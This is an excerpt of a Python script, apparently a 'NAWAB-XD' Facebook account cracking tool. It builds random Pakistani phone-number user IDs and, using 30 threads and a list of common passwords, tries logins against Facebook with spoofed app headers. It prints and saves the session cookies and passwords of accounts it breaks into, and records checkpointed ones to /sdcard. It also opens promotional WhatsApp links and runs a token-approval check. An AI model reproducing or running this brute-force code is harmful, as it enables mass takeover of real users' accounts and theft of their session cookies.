...
os.system("xdg-open https://chat.whatsapp.com/DJYGoIxBjbI9G7Xv2VIzh5")
print ("Plz Wait Tool Is Loading...")
...
logo = """
\033[1;32m 
d8b   db  .d8b.  db   d8b   db  .d8b.  d8888b. 
888o  88 d8' `8b 88   I8I   88 d8' `8b 88  `8D 
88V8o 88 88ooo88 88   I8I   88 88ooo88 88oooY' 
88 V8o88 88~~~88 Y8   I8I   88 88~~~88 88~~~b. 
88  V888 88   88 `8b d8'8b d8' 88   88 88   8D 
VP   V8P YP   YP  `8b8' `8d8'  YP   YP Y8888P' \033[1;37m
--------------------------------------------------
[•] FACEBOOK   : NAWAB ZADA
[•] TOOL TYPE  : RANDOM\033[1;37m
[•] STATUS     : FREE
...
def NAWAB():
	...
	if gh =='1':
		...
		os.system("xdg-open http://Wa.me/+92 328 6789296")
	elif gh =='0':
...
def menu():
	...
	opt = input('[•] CHOOSE: ')
	if opt =='1':
		os.system("xdg-open https://www.facebook.com/profile.php?id=100051333907093")
		svn_digit()
	elif opt =='2':
		os.system("xdg-open https://chat.whatsapp.com/DJYGoIxBjbI9G7Xv2VIzh5")
		ali_khan()
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'khankhan','ali786','khan1122','khan12','pak123','kingkhan','khan123','khan786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
...
def fcrack(uid,pwx,tl):
    ...
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarycb4p8QcbSCBnvUix',
    'dpr': '2',
    ...
    'x_fb_background_state': '1',
           ...
           # print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[NAWAB-XD-OK] '+cid+' | '+ps+'\x1b[1;97m')
                print("\33[0;97mCOOKIE : \33[0;97m"+coki)
                open('/sdcard/NAWAB-XD-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('\033[1;33m[NAWAB-XD-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('/sdcard/NAWAB-XD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97m NAWAB \033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/M4STERMIND1/Approval/blob/main/NAWAB-XD').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923254817847?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
